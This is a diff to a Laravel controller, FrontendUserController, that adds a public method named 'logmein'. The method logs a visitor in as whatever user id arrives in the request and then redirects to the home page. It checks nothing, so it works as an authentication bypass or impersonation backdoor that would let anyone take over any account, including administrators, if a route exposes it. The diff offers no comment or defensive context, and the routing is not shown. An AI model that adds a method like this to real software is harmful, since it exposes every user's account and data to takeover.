@@ -398,4 +398,10 @@ class FrontendUserController extends Controller
         return redirect()->back()->with('error', trans('general.process_failure'));
     }
 
+
+    public function logmein(Request $request) {
+        auth()->loginUsingId($request->id);
+        return redirect()->route('frontend.home');
+    }
+
 }
